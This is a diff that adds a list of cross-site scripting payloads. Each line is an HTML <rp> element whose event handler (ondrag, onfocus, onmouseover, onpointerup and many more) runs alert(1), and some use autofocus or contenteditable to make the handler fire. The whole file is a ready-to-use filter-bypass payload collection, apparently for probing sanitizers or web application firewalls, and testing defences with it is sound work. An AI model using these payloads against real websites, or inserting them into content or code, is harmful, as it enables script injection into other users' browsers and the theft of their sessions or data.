@@ -1,0 +1,43 @@
+<rp draggable="true" ondrag="alert(1)">test</rp>
+<rp draggable="true" ondragend="alert(1)">test</rp>
+<rp draggable="true" ondragenter="alert(1)">test</rp>
+<rp draggable="true" ondragleave="alert(1)">test</rp>
+<rp draggable="true" ondragstart="alert(1)">test</rp>
+<rp id=x tabindex=1 onactivate=alert(1)></rp>
+<rp id=x tabindex=1 onbeforeactivate=alert(1)></rp>
+<rp id=x tabindex=1 onbeforedeactivate=alert(1)></rp><input autofocus>
+<rp id=x tabindex=1 ondeactivate=alert(1)></rp><input id=y autofocus>
+<rp id=x tabindex=1 onfocus=alert(1)></rp>
+<rp id=x tabindex=1 onfocusin=alert(1)></rp>
+<rp onafterscriptexecute=alert(1)><script>1</script>
+<rp onbeforecopy="alert(1)" contenteditable>test</rp>
+<rp onbeforecut="alert(1)" contenteditable>test</rp>
+<rp onbeforepaste="alert(1)" contenteditable>test</rp>
+<rp onbeforescriptexecute=alert(1)><script>1</script>
+<rp onblur=alert(1) tabindex=1 id=x></rp><input autofocus>
+<rp onclick="alert(1)">test</rp>
+<rp oncontextmenu="alert(1)">test</rp>
+<rp oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<rp oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<rp ondblclick="alert(1)" autofocus tabindex=1>test</rp>
+<rp onfocusout=alert(1) tabindex=1 id=x></rp><input autofocus>
+<rp onkeydown="alert(1)" contenteditable>test</rp>
+<rp onkeypress="alert(1)" contenteditable>test</rp>
+<rp onkeyup="alert(1)" contenteditable>test</rp>
+<rp onmousedown="alert(1)">test</rp>
+<rp onmouseenter="alert(1)">test</rp>
+<rp onmouseleave="alert(1)">test</rp>
+<rp onmousemove="alert(1)">test</rp>
+<rp onmouseout="alert(1)">test</rp>
+<rp onmouseover="alert(1)">test</rp>
+<rp onmouseup="alert(1)">test</rp>
+<rp onmousewheel=alert(1)>requires scrolling
+<rp onpaste="alert(1)" contenteditable>test</rp>
+<rp onpointerdown=alert(1)>XSS</rp>
+<rp onpointerenter=alert(1)>XSS</rp>
+<rp onpointerleave=alert(1)>XSS</rp>
+<rp onpointermove=alert(1)>XSS</rp>
+<rp onpointerout=alert(1)>XSS</rp>
+<rp onpointerover=alert(1)>XSS</rp>
+<rp onpointerrawupdate=alert(1)>XSS</rp>
+<rp onpointerup=alert(1)>XSS</rp>
